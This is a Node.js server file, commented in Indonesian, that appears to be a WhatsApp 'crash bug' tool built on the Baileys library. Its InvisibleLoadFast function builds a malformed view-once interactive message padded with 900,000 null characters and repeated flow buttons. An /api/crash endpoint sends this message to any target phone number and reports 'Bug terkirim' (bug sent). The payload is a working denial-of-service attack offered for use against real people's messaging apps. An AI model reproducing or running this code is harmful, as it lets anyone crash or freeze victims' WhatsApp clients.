const express = require("express");
const fs = require("fs");
const { makeWASocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require("@whiskeysockets/baileys");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(express.static("public"));

// Inisialisasi WhatsApp Socket
let sock = null;
let pairingCode = null;
let isConnected = false;

// Fungsi untuk menghubungkan WhatsApp
async function connectToWhatsApp() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState("auth_info");
    const { version } = await fetchLatestBaileysVersion();
    
    sock = makeWASocket({
      version,
      printQRInTerminal: true,
      auth: state,
      generateHighQualityLinkPreview: true,
    });
    
    sock.ev.on("creds.update", saveCreds);
    sock.ev.on("connection.update", (update) => {
      const { connection, lastDisconnect } = update;
      
      if (connection === "close") {
        isConnected = false;
        console.log("Connection closed, reconnecting...");
        setTimeout(connectToWhatsApp, 5000);
      } else if (connection === "open") {
        isConnected = true;
        pairingCode = null;
        console.log("WhatsApp connection opened!");
      }
      
      // Generate pairing code ketika diminta
      if (update.qr) {
        console.log("QR Code received, but using pairing code method");
      }
    });
  } catch (error) {
    console.error("Error connecting to WhatsApp:", error);
  }
}

// Panggil fungsi koneksi
connectToWhatsApp();

const loadUsers = () => {
  try {
    if (fs.existsSync("./users.json")) {
      return JSON.parse(fs.readFileSync("./users.json", "utf8"));
    }
    return [];
  } catch (error) {
    console.error("Error loading users:", error);
    return [];
  }
};

const saveUsers = (data) => {
  try {
    fs.writeFileSync("./users.json", JSON.stringify(data, null, 2));
  } catch (error) {
    console.error("Error saving users:", error);
  }
};

// Function InvisibleLoadFast yang diperbaiki
async function InvisibleLoadFast(target) {
  if (!sock || !isConnected) {
    throw new Error("WhatsApp connection not established yet");
  }
  
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "⏤͟͟͞͞ꀸꍟ꒒ꀎꏳꍏ ꀤꑄ ꃅꍟꋪꍟ⿻" + "\u0000".repeat(900000),
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      participant: { jid: target },
    });
    return true;
  } catch (err) {
    console.log("Error in InvisibleLoadFast:", err);
    throw err;
  }
}

// API Routes
app.post("/api/add-user", (req, res) => {
  try {
    const { phone, role } = req.body;
    if (!phone) {
      return res.status(400).json({ success: false, message: "Phone number is required" });
    }
    
    const users = loadUsers();
    users.push({ phone, role, timestamp: new Date().toISOString() });
    saveUsers(users);
    res.json({ success: true, message: "User added." });
  } catch (error) {
    res.status(500).json({ success: false, message: "Internal server error" });
  }
});

app.post("/api/add-admin", (req, res) => {
  try {
    const { phone } = req.body;
    if (!phone) {
      return res.status(400).json({ success: false, message: "Phone number is required" });
    }
    
    const users = loadUsers();
    users.push({ phone, role: "admin", timestamp: new Date().toISOString() });
    saveUsers(users);
    res.json({ success: true, message: "Admin added." });
  } catch (error) {
    res.status(500).json({ success: false, message: "Internal server error" });
  }
});

app.post("/api/change-role", (req, res) => {
  try {
    const { phone, newRole } = req.body;
    if (!phone || !newRole) {
      return res.status(400).json({ success: false, message: "Phone number and new role are required" });
    }
    
    const users = loadUsers();
    const user = users.find(u => u.phone === phone);
    if (user) {
      user.role = newRole;
      user.timestamp = new Date().toISOString();
      saveUsers(users);
      res.json({ success: true, message: "Role updated." });
    } else {
      res.status(404).json({ success: false, message: "User not found." });
    }
  } catch (error) {
    res.status(500).json({ success: false, message: "Internal server error" });
  }
});

// Endpoint untuk generate pairing code - YANG PALING PENTING
app.post("/api/generate-pairing", async (req, res) => {
  try {
    const { sender } = req.body;
    
    if (!sock) {
      return res.status(503).json({ success: false, message: "WhatsApp client not initialized" });
    }
    
    // Generate pairing code
    try {
      pairingCode = await sock.requestPairingCode(sender || "RiexxDeCodeX-Bot");
      console.log("Pairing Code generated:", pairingCode);
      
      res.json({ 
        success: true, 
        pairingCode,
        message: "Pairing code generated successfully. Use it in WhatsApp Linked Devices."
      });
    } catch (error) {
      console.error("Error generating pairing code:", error);
      res.status(500).json({ 
        success: false, 
        message: "Failed to generate pairing code: " + error.message 
      });
    }
  } catch (error) {
    console.error("Error in /api/generate-pairing:", error);
    res.status(500).json({ 
      success: false, 
      message: "Internal server error: " + error.message 
    });
  }
});

// Endpoint untuk mengecek status koneksi
app.get("/api/connection-status", (req, res) => {
  try {
    if (sock && isConnected) {
      res.json({ 
        success: true, 
        connected: true, 
        user: sock.user?.id ? sock.user.id.replace(/:\d+@/, '@') : 'Unknown'
      });
    } else {
      res.json({ 
        success: true, 
        connected: false, 
        user: null,
        message: "Not connected to WhatsApp"
      });
    }
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      message: "Error checking connection status: " + error.message 
    });
  }
});

app.post("/api/crash", async (req, res) => {
  try {
    const { target } = req.body;
    
    if (!target) {
      return res.status(400).json({ success: false, message: "Target number is required." });
    }

    // Pastikan koneksi WhatsApp sudah terbuka
    if (!sock || !isConnected) {
      return res.status(503).json({ 
        success: false, 
        message: "WhatsApp connection not ready. Please connect first." 
      });
    }

    await InvisibleLoadFast(target);
    res.json({ success: true, message: `Bug terkirim ke ${target}` });
  } catch (err) {
    console.error("Error in /api/crash:", err);
    res.status(500).json({ 
      success: false, 
      message: "Gagal kirim bug: " + err.message 
    });
  }
});

// Default route untuk menangani request tidak dikenal
app.use((req, res) => {
  res.status(404).json({ 
    success: false, 
    message: `Endpoint ${req.url} not found` 
  });
});

app.listen(PORT, () => {
  console.log(`🚀 RiexxDeCodeX Server running on port ${PORT}`);
  console.log("📱 Please connect WhatsApp using the pairing code");
});
